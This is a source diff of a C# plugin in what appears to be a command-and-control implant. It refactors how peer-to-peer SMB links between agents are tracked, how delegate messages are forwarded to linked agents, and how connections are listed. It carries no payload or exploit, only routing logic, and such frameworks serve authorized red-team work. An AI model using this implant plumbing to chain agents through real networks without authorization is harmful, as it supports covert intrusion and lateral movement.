@@ -13,7 +13,6 @@ namespace Agent
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
         private ConcurrentDictionary<string, SmbLink> forwarders = new ConcurrentDictionary<string, SmbLink>();
-        private ConcurrentDictionary<string, SmbLink> tempForwarders = new ConcurrentDictionary<string, SmbLink>(); //Used to store before we know the "true" UUID of the fwd
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
@@ -35,7 +34,6 @@ namespace Agent
                 });
                 return;
             }
-
             switch (args.action)
             {
                 case "link":
@@ -74,16 +72,22 @@ namespace Agent
 
         public async Task CreateNewLink(SmbLinkArgs args, string task_id)
         {
+            //Create a new guid to track our link
             string linkId = Guid.NewGuid().ToString();
-            var link = new SmbLink(messageManager, logger, args, linkId, config.uuid, task_id);
 
-            if(this.tempForwarders.TryAdd(linkId, link))
+            //Create our new SmbLink object
+            var link = new SmbLink(messageManager, logger, args, config.uuid, task_id);
+
+            //Add it to the tracker with our randomly generated guid
+            if (this.forwarders.TryAdd(linkId, link))
             {
-                EdgeResponse err = await this.tempForwarders[linkId].Link();
+                //Attempt to link it
+                EdgeResponse err = await this.forwarders[linkId].Link();
                 this.messageManager.AddTaskResponse(err.ToJson());
                 return;
             }
 
+            //This gets sent if we already linked to this guid, but should never practically hit.
             this.messageManager.AddTaskResponse(new TaskResponse()
             {
                 task_id = task_id,
@@ -91,7 +95,7 @@ namespace Agent
                 status = "error",
                 completed = true
             });
-            
+
         }
 
         public async Task<bool> UnlinkForwarder(string linkId)
@@ -101,37 +105,23 @@ namespace Agent
 
         public async Task ForwardDelegate(DelegateMessage dm)
         {
-            string id = dm.uuid;
-            if (!string.IsNullOrEmpty(dm.new_uuid))
+            if (this.forwarders.Any(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid))
             {
-                id = dm.new_uuid;
-            }
+                var fwdr = this.forwarders.Where(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid).First();
 
-            if (!forwarders.ContainsKey(dm.uuid)) //Check to see if it's a first message or not
-            {
-                SmbLink fwd;
-                if (this.tempForwarders.TryRemove(dm.uuid, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
+                if (!string.IsNullOrEmpty(dm.new_uuid))
                 {
-                    this.forwarders.TryAdd(dm.new_uuid, fwd);
-                    this.forwarders[dm.new_uuid].linkId = dm.new_uuid;
-                    dm.uuid = dm.new_uuid;
+                    fwdr.Value.linked_agent_id = dm.new_uuid;
                 }
+                await fwdr.Value.ForwardDelegateMessage(dm);
             }
-
-            await this.forwarders[id].ForwardDelegateMessage(dm);
         }
 
         public async Task ListConnections(ServerJob job)
         {
-            StringBuilder sb = new StringBuilder();
-            foreach (var fwdr in this.forwarders)
-            {
-                sb.AppendLine($"ID: {fwdr.Value.linkId}\tType: smb\tConnected: {fwdr.Value.connected}");
-            }
-
             this.messageManager.AddTaskResponse(new TaskResponse()
             {
-                user_output = sb.ToString(),
+                user_output = JsonSerializer.Serialize(this.forwarders),
                 task_id = job.task.id,
                 completed = true,
 
